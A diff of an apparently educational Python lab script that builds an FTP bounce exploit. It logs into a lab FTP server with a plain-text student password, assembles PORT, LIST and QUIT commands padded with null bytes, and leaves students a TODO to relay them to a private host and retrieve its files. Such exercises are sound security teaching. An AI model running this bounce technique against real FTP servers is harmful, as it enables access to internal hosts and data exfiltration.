@@ -5,7 +5,7 @@ ftp = FTP("192.168.56.101", debug=True)
 ftp.send_login_commands("student", "golyeeHug6")
 
 ################################################################################
-# Build a script to get a LIST of files on the private server.
+# Builds a script to get a LIST of files on the private server.
 ################################################################################
 
 # 1. Commands to log in.
@@ -16,29 +16,23 @@ exfiltration_data_address = ftp.new_data_address()
 port_command = ftp.get_port_command(exfiltration_data_address)
 
 # 3. Build up the list of commands.
-exploit_commands = []
-exploit_commands.append(login_commands)
-exploit_commands.append(port_command)
-exploit_commands.append("LIST")
-exploit_commands.append("QUIT")
+exploit_command_list = []
+exploit_command_list.append(login_commands)
+exploit_command_list.append(port_command)
+################################################################################
+# STUDENT: To begin with this just LISTs files on the private server.
+# Once you have this script working, try RETRieving the contents of the files
+# it lists.
+################################################################################
+exploit_command_list.append("LIST")
+exploit_command_list.append("QUIT")
 
 # 4. Put the commands together. Pad with 1M nullbytes to ensure socket stays open long enough.
-exploit_file = "exploit.txt"
-file_contents = "\r\n".join(exploit_commands) + "\0" * 1000000
+exploit_commands = "\r\n".join(exploit_command_list) + "\0" * 1000000
+print("exploit_commands:\n%s" % exploit_commands)
 
 ################################################################################
-# STUDENT TODO 1: Upload the script to the server.
-# Hint: the provided examples/stor.py will be useful.
-################################################################################
-
-################################################################################
-# STUDENT TODO 2: Have the server send the script to the private server.
-# Hint: the provided examples/remote_port.py will be useful.
-# Hint: unlike in that example, we *are* recieving data inbetween the two data
-#       transfer status responses.
-# Hint: you need to get data from the same port as exfiltration_data_address.
-#       ftp.new_data_address(port=exfiltration_data_address[1])
-#       print("EXFILTRATED DATA: %s" % ftp.recv_data())
+# STUDENT TODO: Get exploit_commands to be run on the 192.168.56.102 server.
 ################################################################################
 
 ftp.close()
